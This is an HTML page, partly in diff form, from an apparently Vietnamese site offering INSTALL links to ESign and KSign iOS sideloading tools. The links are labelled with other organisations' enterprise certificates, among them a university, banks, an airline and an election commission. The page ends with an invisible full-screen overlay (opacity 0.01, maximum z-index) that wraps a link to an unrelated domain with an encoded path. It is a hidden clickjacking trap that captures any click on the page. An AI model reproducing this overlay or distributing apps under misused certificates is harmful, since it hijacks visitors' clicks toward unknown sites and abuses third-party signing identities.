alt="ESign ChiBa V1" loading="lazy"><div class="app-text"><div class="app-title">ESign ChiBa V1</div><div class="app-sub">CHIBA INSTITUTE OF TECHNOLOGY</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/qeSTpu" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="47"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign ChiBa V2" loading="lazy"><div class="app-text"><div class="app-title">ESign ChiBa V2</div><div class="app-sub">CHIBA INSTITUTE OF TECHNOLOGY</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/AhPiWP" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="48"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign ChiBa V3" loading="lazy"><div class="app-text"><div class="app-title">ESign ChiBa V3</div><div class="app-sub">CHIBA INSTITUTE OF TECHNOLOGY</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/1UIfSe" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="49"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign ChiBa V4" loading="lazy"><div class="app-text"><div class="app-title">ESign ChiBa V4</div><div class="app-sub">CHIBA INSTITUTE OF TECHNOLOGY</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/axb5B2" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="50"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign" loading="lazy"><div class="app-text"><div class="app-title">ESign</div><div class="app-sub">VIETNAM JOINT STOCK COMMERCIAL BANK FOR INDUSTRY AND TRADE</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/3t0t8X" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="51"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign VN V1" loading="lazy"><div class="app-text"><div class="app-title">ESign VN V1</div><div class="app-sub">VIETNAM JOINT STOCK COMMERCIAL BANK FOR INDUSTRY AND TRADE</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/yA7Vr0" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="52"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign VN V2" loading="lazy"><div class="app-text"><div class="app-title">ESign VN V2</div><div class="app-sub">VIETNAM JOINT STOCK COMMERCIAL BANK FOR INDUSTRY AND TRADE</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/4D8wjF" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="53"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign" loading="lazy"><div class="app-text"><div class="app-title">ESign</div><div class="app-sub">GLOBAL TAKEOFF, INC</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/hZgAt7" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="54"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign GlOBAL V1" loading="lazy"><div class="app-text"><div class="app-title">ESign GlOBAL V1</div><div class="app-sub">GLOBAL TAKEOFF, INC</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/fnOXAo" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="55"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign GlOBAL V2" loading="lazy"><div class="app-text"><div class="app-title">ESign GlOBAL V2</div><div class="app-sub">GLOBAL TAKEOFF, INC</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/BEZcKD" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="56"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign GlOBAL V3" loading="lazy"><div class="app-text"><div class="app-title">ESign GlOBAL V3</div><div class="app-sub">GLOBAL TAKEOFF, INC</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/skjKPF" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="57"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign GlOBAL V4" loading="lazy"><div class="app-text"><div class="app-title">ESign GlOBAL V4</div><div class="app-sub">GLOBAL TAKEOFF, INC</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/VjHmnf" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="58"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign GlOBAL V5" loading="lazy"><div class="app-text"><div class="app-title">ESign GlOBAL V5</div><div class="app-sub">GLOBAL TAKEOFF, INC</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/ufbyRf" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="59"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign GlOBAL V6" loading="lazy"><div class="app-text"><div class="app-title">ESign GlOBAL V6</div><div class="app-sub">GLOBAL TAKEOFF, INC</div></div><div class="app-action">INSTALL</div></a></div></div>
+</div>
+<div id="panel-ksign" role="tabpanel" aria-labelledby="tab-ksign" class="tab-panel" hidden="">
+  <div class="apps-wrap"><div class="ksign-section"><a href="https://api.khoindvn.io.vn/JnAsbd" class="app-row" target="_blank" rel="noopener"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYlk6oHRX_isIEsA0183yypCcVuMNaseuGzSymQIUY1g&amp;s" class="app-icon" alt="KSign ✅" loading="lazy"><div class="app-text"><div class="app-title">KSign ✅</div><div class="app-sub">XL AXIATA, PT TBK</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/KerPQi" class="app-row" target="_blank" rel="noopener"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYlk6oHRX_isIEsA0183yypCcVuMNaseuGzSymQIUY1g&amp;s" class="app-icon" alt="KSign" loading="lazy"><div class="app-text"><div class="app-title">KSign</div><div class="app-sub">National Oilwell Varco, Inc.</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/REVuA5" class="app-row" target="_blank" rel="noopener"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYlk6oHRX_isIEsA0183yypCcVuMNaseuGzSymQIUY1g&amp;s" class="app-icon" alt="KSign" loading="lazy"><div class="app-text"><div class="app-title">KSign</div><div class="app-sub">VIETNAM AIRLINES JSC</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/NyEYpb" class="app-row" target="_blank" rel="noopener"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYlk6oHRX_isIEsA0183yypCcVuMNaseuGzSymQIUY1g&amp;s" class="app-icon" alt="KSign" loading="lazy"><div class="app-text"><div class="app-title">KSign</div><div class="app-sub">PowerChina International Group Limited</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/h5ZX40" class="app-row" target="_blank" rel="noopener"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYlk6oHRX_isIEsA0183yypCcVuMNaseuGzSymQIUY1g&amp;s" class="app-icon" alt="KSign " loading="lazy"><div class="app-text"><div class="app-title">KSign </div><div class="app-sub">Luoyang Postal Administration</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/Esx6ba" class="app-row" target="_blank" rel="noopener"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYlk6oHRX_isIEsA0183yypCcVuMNaseuGzSymQIUY1g&amp;s" class="app-icon" alt="KSign" loading="lazy"><div class="app-text"><div class="app-title">KSign</div><div class="app-sub">Commission on Elections</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/N7lNfm" class="app-row" target="_blank" rel="noopener"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYlk6oHRX_isIEsA0183yypCcVuMNaseuGzSymQIUY1g&amp;s" class="app-icon" alt="KSign" loading="lazy"><div class="app-text"><div class="app-title">KSign</div><div class="app-sub">CHIBA INSTITUTE OF TECHNOLOGY</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/9LLTsM" class="app-row" target="_blank" rel="noopener"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYlk6oHRX_isIEsA0183yypCcVuMNaseuGzSymQIUY1g&amp;s" class="app-icon" alt="KSign" loading="lazy"><div class="app-text"><div class="app-title">KSign</div><div class="app-sub">GLOBAL TAKEOFF, INC</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/2rSU4B" class="app-row" target="_blank" rel="noopener"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYlk6oHRX_isIEsA0183yypCcVuMNaseuGzSymQIUY1g&amp;s" class="app-icon" alt="KSign" loading="lazy"><div class="app-text"><div class="app-title">KSign</div><div class="app-sub">Qingdao Rural Commercial Bank Co., Ltd</div></div><div class="app-action">INSTALL</div></a></div></div>
+</div>
+
+<!-- ═══════════════════ SKILLS ═══════════════════ -->
+<span class="section-label" id="skills">Kỹ năng</span>
+
+<section class="skills-section" aria-labelledby="skills-h">
+  <div class="skills-card">
+    <h2 id="skills-h">Kỹ năng Lập trình</h2>
+    <div class="skill-row">
+      <span class="skill-name">HTML/CSS</span>
+      <div class="skill-track"><div class="skill-fill" data-percent="76%" style="background: rgb(227, 76, 38); width: 76%;"></div></div>
+      <span class="skill-pct">76%</span>
+    </div>
+    <div class="skill-row">
+      <span class="skill-name">Lua</span>
+      <div class="skill-track"><div class="skill-fill" data-percent="68%" style="background: rgb(31, 90, 249); width: 68%;"></div></div>
+      <span class="skill-pct">68%</span>
+    </div>
+    <div class="skill-row">
+      <span class="skill-name">PHP</span>
+      <div class="skill-track"><div class="skill-fill" data-percent="12%" style="background: rgb(137, 165, 243); width: 12%;"></div></div>
+      <span class="skill-pct">12%</span>
+    </div>
+    <div class="skill-row">
+      <span class="skill-name">MySQL</span>
+      <div class="skill-track"><div class="skill-fill" data-percent="9%" style="background: rgb(242, 145, 17); width: 9%;"></div></div>
+      <span class="skill-pct">9%</span>
+    </div>
+  </div>
+</section>
+    
+</main>
+
+<!-- ═══════════════════ FOOTER ═══════════════════ -->
+<footer class="site-footer">
+  <a href="https://www.dmca.com/r/m2xgyz1" title="DMCA.com Protection Status" data-manus_clickable="true" data-manus_click_id="60">
+    <img src="https://images.dmca.com/Badges/_dmca_premi_badge_5.png?ID=8d6c1d20-15d9-4846-ab00-806948e47695" alt="DMCA" loading="lazy" style="height:26px;margin-bottom:.6rem;">
+  </a><br>
+  <span>© 2026 Vũ Văn Khơi · khoindvn.io.vn</span>
+</footer>
+
+<!-- ═══════════════════ SCRIPTS ═══════════════════ -->
+<script src="main.js" defer="" type="text/javascript"></script>
+<!-- khoindvn.js tự động load phiên bản mới nhất — không cần sửa index.html -->
+<script type="text/javascript">
+  (function() {
+    var s = document.createElement('script');
+    s.src = 'khoindvn.js?_=' + Date.now();
+    s.defer = true;
+    document.head.appendChild(s);
+  })();
+</script>
+
+<script type="text/javascript">
+  function switchTab(tab) {
+    const thumb = document.getElementById('seg-thumb');
+    const btnE  = document.getElementById('tab-esign');
+    const btnK  = document.getElementById('tab-ksign');
+    const panE  = document.getElementById('panel-esign');
+    const panK  = document.getElementById('panel-ksign');
+
+    if (tab === 'esign') {
+      thumb.style.transform = 'translateX(0)';
+      btnE.classList.add('active');    btnE.setAttribute('aria-selected','true');
+      btnK.classList.remove('active'); btnK.setAttribute('aria-selected','false');
+      // Fade panel
+      panE.hidden = false;
+      panE.classList.remove('tab-panel'); void panE.offsetWidth; panE.classList.add('tab-panel');
+      panK.hidden = true;
+    } else {
+      thumb.style.transform = `translateX(${btnE.offsetWidth}px)`;
+      btnK.classList.add('active');    btnK.setAttribute('aria-selected','true');
+      btnE.classList.remove('active'); btnE.setAttribute('aria-selected','false');
+      panK.hidden = false;
+      panK.classList.remove('tab-panel'); void panK.offsetWidth; panK.classList.add('tab-panel');
+      panE.hidden = true;
+    }
+  }
+</script>
+
+<!-- Google Analytics -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-CLK70W4PDR" type="text/javascript"></script>
+<script type="text/javascript">
+  window.dataLayer=window.dataLayer||[];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js',new Date()); gtag('config','G-CLK70W4PDR');
+</script>
+  <style>
+  #ab-overlay{display:none;position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,.85);backdrop-filter:blur(10px);align-items:center;justify-content:center;font-family:sans-serif}
+  #ab-overlay.show{display:flex}
+  #ab-box{background:#13151c;border:1px solid #2a2d3a;border-radius:16px;padding:2rem 1.8rem;max-width:420px;width:calc(100% - 2rem);text-align:center;color:#fff}
+  #ab-box .icon{font-size:2.5rem;margin-bottom:.8rem}
+  #ab-box h2{font-size:1.25rem;font-weight:800;margin-bottom:.4rem}
+  #ab-box h2 span{display:block;font-size:1rem;color:#f5a623;margin-top:.2rem}
+  #ab-box p{color:#888;font-size:.85rem;line-height:1.7;margin-bottom:1.4rem}
+  #ab-box p span{display:block}
+  #ab-btn{width:100%;background:linear-gradient(135deg,#f5a623,#ff6b35);color:#000;font-weight:700;font-size:.9rem;border:none;border-radius:10px;padding:.85rem;cursor:pointer}
+  #ab-btn:hover{opacity:.88}
+  #ab-status{margin-top:.9rem;font-size:.75rem;color:#555;display:flex;align-items:center;justify-content:center;gap:.4rem}
+  #ab-dot{width:7px;height:7px;border-radius:50%;background:#ef4444}
+  #ab-dot.ok{background:#22c55e}
+</style>
+
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;27829ebfd1dd46ab8a508c8fb5eabbe1&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+
+<div id="k758xha" style="--rdata: k758xha; position: fixed; inset: 0px; z-index: 2147483647; background: black; opacity: 0.01; height: 1100px; width: 1280px;"><a id="lkzop" href="https://ministercheckingpeering.com/cbW40FAEDB/QcLDRETFx0fJSkrLzUVK/j9UaX6TqL3S5/_zzWmpVUvYZDujk/DNhgFeh/IRvFJj1ja/tVV24Wq6L_u5mo/PYnuAoS-Ala/TatckA9gX-j/K6n9cE8/orRfkpQ_/27j6-1DqM/ciOoqEVyFJ/oyYR_UtLDW/YWtqwwBJEfjw8PY/GJ7Z/AiN7bk1MPtXBhijVN/dmVOWk/bu7RQWJbf7INB3jJryX/by7v/N4LirXFIw4Fn/IGIXHqNEXuScy2/LQDAYSVzB/zXn0/WE4EYfIROvb/hD6LpCUpHbxhk_/hacUvY/A71C-6JC/8UoJYkDpab0t/4kwl8AxxmkRuoPjO7o/-Kj/NwIF3wD/o0U7gVvKeVXBP/UXDG34IU7lxk4/4bjgGpLWtz3ZSTVf0T/DflwB1w=/=/" target="_blank" style="display: block; height: inherit;" data-manus_clickable="true" data-manus_click_id="61"></a></div></body></html>
